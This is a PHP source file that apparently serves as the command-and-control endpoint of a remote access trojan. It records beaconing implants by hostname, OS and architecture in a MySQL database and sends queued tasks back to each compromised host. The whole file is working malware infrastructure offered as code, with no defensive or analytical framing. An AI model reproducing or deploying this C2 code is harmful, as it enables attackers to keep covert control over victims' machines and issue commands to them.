<?php
  # Specifies character set to use
  header("content-type:text/html;charset=utf-8");

  # If the implant is beaconing to our C2
  # These parameters will be set if the implant is beaconing
  if (isset($_POST["hostname"]) && isset($_POST["os"]) && isset($_POST["architecture"]))
  {
    # Includes the RAT configuration file
    include "config/config.php";
      
    # Establishes a connection to the RAT database
    # Uses variables set in "config/config.php" file
    # "SET NAMES utf8" is CRUCIAL! This makes it so that special characters are captured into the MySQL table
    $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));

    # URL decodes beacon POST parameters
    $hostname = urldecode($_POST["hostname"]);
    $os = urldecode($_POST["os"]);
    $architecture = urldecode($_POST["architecture"]);

    # Gets the current date and time in UTC
    # This will be used to update the beacon date in the "hosts" table
    $date = gmdate("Y-m-d H:i:s");

    # Is this a new beaconing host?
    # If so we need to add it to the "hosts" table
    # rowCount will return 0 if it's a new beaconing host
    # rowCount will return 1 if it's a host that has beaconed previously
    $statement = $dbConnection->prepare("SELECT * FROM hosts WHERE hostname = :hostname AND architecture = :architecture AND os = :os");
    $statement->bindValue(":hostname", $hostname);
    $statement->bindValue(":architecture", $architecture);
    $statement->bindValue(":os", $os);
    $statement->execute();
    $rowCount = $statement->rowCount();
    
    # This is a host that has beaconed previously
    # We need to update the beacon date in the "hosts" table
    # We also need to see if it has anything tasked
    if ($rowCount == 1)
    {
      # Updates the implant's beacon date in the "hosts" table
      $statement = $dbConnection->prepare("UPDATE hosts SET date = :date WHERE hostname = :hostname AND architecture = :architecture AND os = :os");
      $statement->bindValue(":date", $date);
      $statement->bindValue(":hostname", $hostname);
      $statement->bindValue(":architecture", $architecture);
      $statement->bindValue(":os", $os);
      $statement->execute();

      # Is anything tasked for this beaconing host?
      # rowCount will return 1 if the beaconing host has something tasked
      # rowCount will return 0 if the beaconing host has nothing tasked
      # LIMIT 1 is used so that no more than one tasked action is returned
      $statement = $dbConnection->prepare("SELECT * FROM tasks WHERE hostname = :hostname LIMIT 1");
      $statement->bindValue(":hostname", $hostname);
      $statement->execute();
      $rowCount = $statement->rowCount();
         
      # The beaconing host has something tasked    		
      # We need to echo the text that describes this task to the HTTP response
      if ($rowCount == 1)
      {
        # Something is tasked so we need to fetch the MySQL results from the previous query above
        $results = $statement->fetch();
        $taskID = $results["id"];
        $taskAction = $results["action"];
        $taskSecondary = $results["secondary"];

        # Echoes the task data to the HTTP response
        echo "<id>" . $taskID . "<id><action>" . $taskAction . "<action><secondary>" . $taskSecondary . "<secondary>";
      }

      # Kills the database connection
      $statement->connection = null;
    }
    # Else this is a new beaconing host
    # We need to add it to the "hosts" table
    else
    {
      # New beaconing host gets added to the "hosts" table
      $statement = $dbConnection->prepare("INSERT INTO hosts (hostname, date, os, architecture) VALUES (:hostname, :date, :os, :architecture)");
      $statement->bindValue(":hostname", $hostname);
      $statement->bindValue(":date", $date);
      $statement->bindValue(":os", $os);
      $statement->bindValue("architecture", $architecture);
      $statement->execute();

      # Kills the database connection
      $statement->connection = null;
    }
  }
?>